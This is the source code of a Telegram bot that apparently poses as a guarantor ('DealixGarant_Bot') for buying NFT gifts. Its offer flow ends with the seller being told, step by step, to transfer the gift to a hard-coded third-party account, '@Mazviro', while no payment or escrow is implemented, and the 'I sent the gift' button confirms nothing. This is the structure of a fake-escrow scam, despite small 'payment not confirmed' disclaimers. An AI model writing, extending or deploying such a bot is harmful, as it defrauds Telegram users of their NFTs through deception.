
import { InlineKeyboard } from "grammy";
import { randomBytes } from "node:crypto";

const BOT = "DealixGarant_Bot";
const RECEIVER = "@Mazviro";
const offers = new Map();
const DAY = 86400000;

function parse(text) {
  const m = text.trim().match(
    /^(?:offer\s+)?(?:https?:\/\/)?(?:www\.)?(?:t\.me|telegram\.me)\/nft\/([a-z0-9_-]+)-(\d+)\/?\s+(\d+)$/i
  );
  if (!m) return null;

  const price = Number(m[3]);
  if (!Number.isSafeInteger(price) || price < 1) return null;

  const name = m[1]
    .replace(/([a-z])([A-Z])/g, "$1 $2")
    .replace(/([A-Z]+)([A-Z][a-z])/g, "$1 $2");

  return {
    gift: `${name} #${m[2]}`,
    url: `https://t.me/nft/${m[1]}-${m[2]}`,
    price
  };
}

function create(data, buyer) {
  const key = randomBytes(8).toString("hex");
  offers.set(key, {
    ...data,
    buyer,
    status: "active",
    acceptedBy: null,
    expires: Date.now() + DAY
  });
  return key;
}

function preview(url) {
  return {
    is_disabled: false,
    url,
    prefer_large_media: true
  };
}

function initial(o) {
  return (
    `🎁 Предложение о покупке NFT\n\n` +
    `${o.buyer} предлагает ${o.price} ⭐ ` +
    `за ${o.gift}.\n\n` +
    `⏳ Действует 24 часа.\n\n` +
    `${o.url}\n\n` +
    `Оплата не подтверждена.`
  );
}

function accepted(o) {
  return (
    `🎁 Предложение принято\n\n` +
    `Подарок: ${o.gift}\n` +
    `Цена предложения: ${o.price} ⭐\n\n` +
    `${o.url}\n\n` +
    `Получатель: ${RECEIVER}\n\n` +
    `Как передать подарок:\n` +
    `1. Откройте профиль → Подарки.\n` +
    `2. Выберите ${o.gift}.\n` +
    `3. Нажмите «Передать».\n` +
    `4. Проверьте получателя и подтвердите.\n\n` +
    `⚠️ Оплата не подтверждена. ` +
    `Не передавайте NFT до согласования ` +
    `безопасного способа расчёта.`
  );
}

function buttons(key) {
  return new InlineKeyboard()
    .text("✅ Принять", `a:${key}`)
    .text("❌ Отклонить", `r:${key}`);
}

function afterButtons(key) {
  return new InlineKeyboard()
    .text("📋 Как передать", `how:${key}`)
    .row()
    .text("✅ Я передал подарок", `sent:${key}`);
}

export function registerCommands(bot) {
  bot.command("start", async ctx => {
    await ctx.reply(
      "🎁 NFT Offers\n\n" +
      "Создать предложение:\n" +
      "/offer t.me/nft/MadPumpkin-3759 1200\n\n" +
      "Отправить в другой чат:\n" +
      `@${BOT} offer t.me/nft/MadPumpkin-3759 1200`
    );
  });

  bot.command("offer", async ctx => {
    const data = parse(ctx.match || "");
    if (!data) {
      return ctx.reply(
        "Формат:\n/offer t.me/nft/MadPumpkin-3759 1200"
      );
    }

    const key = create(
      data,
      ctx.from.first_name || "Покупатель"
    );

    const o = offers.get(key);

    await ctx.reply(initial(o), {
      reply_markup: buttons(key),
      link_preview_options: preview(o.url)
    });
  });

  bot.inlineQuery(/.*/, async ctx => {
    const data = parse(ctx.inlineQuery.query);
    if (!data) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true
      });
    }

    const key = create(
      data,
      ctx.from.first_name || "Покупатель"
    );

    const o = offers.get(key);

    await ctx.answerInlineQuery([{
      type: "article",
      id: key,
      title: `${o.gift} — ${o.price} ⭐`,
      description: "Предложение о покупке NFT",
      input_message_content: {
        message_text: initial(o),
        link_preview_options: preview(o.url)
      },
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ Принять",
              callback_data: `a:${key}`
            },
            {
              text: "❌ Отклонить",
              callback_data: `r:${key}`
            }
          ]
        ]
      }
    }], {
      cache_time: 0,
      is_personal: true
    });
  });

  bot.callbackQuery(/^a:([a-f0-9]+)$/, async ctx => {
    const key = ctx.match[1];
    const o = offers.get(key);

    if (!o || o.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    if (Date.now() >= o.expires) {
      o.status = "expired";
      return ctx.answerCallbackQuery({
        text: "Срок действия предложения истёк.",
        show_alert: true
      });
    }

    o.status = "accepted";
    o.acceptedBy = ctx.from.id;

    await ctx.answerCallbackQuery({
      text: "✅ Предложение принято. Оплата не подтверждена.",
      show_alert: true
    });

    try {
      await ctx.editMessageText(accepted(o), {
        reply_markup: afterButtons(key),
        link_preview_options: preview(o.url)
      });
    } catch (e) {
      console.error("Edit failed:", e);
    }
  });

  bot.callbackQuery(/^r:([a-f0-9]+)$/, async ctx => {
    const o = offers.get(ctx.match[1]);

    if (!o || o.status !== "active") {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    o.status = "rejected";

    await ctx.answerCallbackQuery({
      text: "❌ Предложение отклонено.",
      show_alert: true
    });

    try {
      await ctx.editMessageReplyMarkup({
        reply_markup: new InlineKeyboard()
      });
    } catch (e) {
      console.error(e);
    }
  });

  bot.callbackQuery(/^how:([a-f0-9]+)$/, async ctx => {
    const o = offers.get(ctx.match[1]);

    if (!o || o.status !== "accepted") {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    await ctx.answerCallbackQuery({
      text:
        "Откройте профиль → Подарки → " +
        "выберите NFT → Передать. " +
        "Проверьте получателя.",
      show_alert: true
    });
  });

  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async ctx => {
    const o = offers.get(ctx.match[1]);

    if (
      !o ||
      o.status !== "accepted" ||
      o.acceptedBy !== ctx.from.id
    ) {
      return ctx.answerCallbackQuery({
        text: "Предложение недоступно.",
        show_alert: true
      });
    }

    await ctx.answerCallbackQuery({
      text: "❌ Передача подарка не подтверждена.",
      show_alert: true
    });
  });
}


